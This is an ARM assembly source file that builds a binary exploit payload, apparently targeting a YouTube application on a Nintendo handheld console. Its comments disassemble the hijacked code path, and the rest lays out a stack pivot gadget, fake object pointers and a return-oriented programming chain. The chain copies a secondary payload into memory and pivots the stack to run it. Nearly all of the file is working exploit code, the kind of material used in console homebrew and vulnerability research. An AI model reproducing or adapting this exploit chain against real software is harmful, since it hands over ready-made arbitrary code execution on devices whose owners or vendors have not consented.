.nds

.create "ytb_payload.bin",0x0

; code to sploit :
; 
; r2 : points to PAYLOAD_LOC
; 
; 102c55c:       e5cd2036        strb    r2, [sp, #54]   ; 0x36
; 102c560:       e28d2008        add     r2, sp, #8
; 102c564:       e58d2000        str     r2, [sp]
; 102c568:       e5902000        ldr     r2, [r0]
; 102c56c:       e592c194        ldr     ip, [r2, #404]  ; 0x194
; 102c570:       e1a02001        mov     r2, r1
; 102c574:       e3a01000        mov     r1, #0
; 102c578:       e12fff3c        blx     ip
; 
; bc07f8:	e5900004 	ldr	r0, [r0, #4]
; bc07fc:	e1a06002 	mov	r6, r2
; bc0800:	e3500000 	cmp	r0, #0
; bc0804:	0a00002c 	beq	0xbc08bc
; bc0808:	e5900010 	ldr	r0, [r0, #16] ; r0 = *(PAYLOAD_LOC + 0x10) = PAYLOAD_LOC + 0x40
; bc080c:	e2904004 	adds	r4, r0, #4 ; *(PAYLOAD_LOC + 0x10) + 0x4 = PAYLOAD_LOC + 0x44
; bc0810:	0a000009 	beq	0xbc083c
; bc0814:	e5940004 	ldr	r0, [r4, #4] r0 = *(*(PAYLOAD_LOC + 0x10) + 0x8) = PAYLOAD_LOC + 0x14
; bc0818:	e3500000 	cmp	r0, #0
; bc081c:	0a000003 	beq	0xbc0830
; bc0820:	e5901000 	ldr	r1, [r0] ; r1 = **(*(PAYLOAD_LOC + 0x10) + 0x8) = PAYLOAD_LOC + 0x18 - 0x30
; bc0824:	e5912030 	ldr	r2, [r1, #48]	; r2 = *(**(*(PAYLOAD_LOC + 0x10) + 0x8) + 0x30) = PAYLOAD_LOC
; bc0828:	e1a01005 	mov	r1, r5
; bc082c:	e12fff32 	blx	r2

.include "../ytb_include/ytb_include.s"

PAYLOAD_LOC equ PAYLOAD_PRIM_LOC

.fill (0x1000 - .), 0xff

.orga 0x0
	.word 0x00100d84 ; stack_pivot : ldmda r4!, {r2, r3, r6, r9, ip, sp, lr, pc}

.orga 0x10
	.word PAYLOAD_LOC + 0x40
	.word PAYLOAD_LOC - 0x30

.orga 0x40 - 0x4
	.word PAYLOAD_LOC + rop ; sp
	.word 0xDEADBABE ; lr
	.word YTB_ROP_NOP ; pc
	.word PAYLOAD_LOC + 0x14 

.orga 0x194
	.word 0x00bc07f8 ; cf above

.orga 0x200
	rop:
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word PAYLOAD_SEC_LOC ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + payload_secondary ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word payload_secondary_end - payload_secondary ; r2
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	second_stack_pivot_data:
	.word YTB_MEMCPY + 0x4 ; skip the stack push because primary payload is read-only, ends in  ldmfd sp!, {r4-r10,lr} ... bx lr | r4
		.word 0xFFFFFFFF ; r4 (garbage) | r5
		.word 0xFFFFFFFF ; r5 (garbage) | r9
		.word 0xFFFFFFFF ; r6 (garbage) | r12
		.word PAYLOAD_SEC_LOC ; r7 (garbage) | sp
		.word 0xFFFFFFFF ; r8 (garbage) | lr
		.word YTB_ROP_NOP ; r9 (garbage) | pc
		.word PAYLOAD_LOC + second_stack_pivot_data ; r10 (stack pivot data ptr)
	.word 0x00119b84 ; ldm r10!, {r4, r5, r9, r12, sp, lr, pc}

	.align 0x4
	payload_secondary:
		.incbin "youtube_payload_secondary.bin"
	payload_secondary_end:

.Close
